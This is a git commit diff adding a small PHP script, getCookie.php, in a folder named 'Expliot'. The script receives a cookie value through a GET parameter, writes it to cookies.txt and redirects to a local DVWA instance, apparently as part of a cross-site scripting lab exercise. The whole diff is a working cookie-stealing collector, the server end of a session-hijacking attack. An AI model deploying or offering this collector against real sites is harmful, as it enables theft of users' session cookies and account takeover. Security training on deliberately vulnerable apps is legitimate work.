0970dbe119f67ceef07ab8ad287e4f3f7d14b2a1
mehrdad <pm.khashayar@yahoo.com>
2023-11-15 18:13:01 +0330

    Update getCookie.php

--- Expliot/getCookie.php
+++ Expliot/getCookie.php
@@ -1,1 +1,12 @@
+<?php
 
+if(isset($_GET['cookie'])){
+
+    $cookie = $_GET['cookie'];
+    $file = fopen('cookies.txt',"w");
+    fwrite($file, $cookie);
+    fclose($file);
+header("Location: localhost/DVWA");
+
+}
+?>
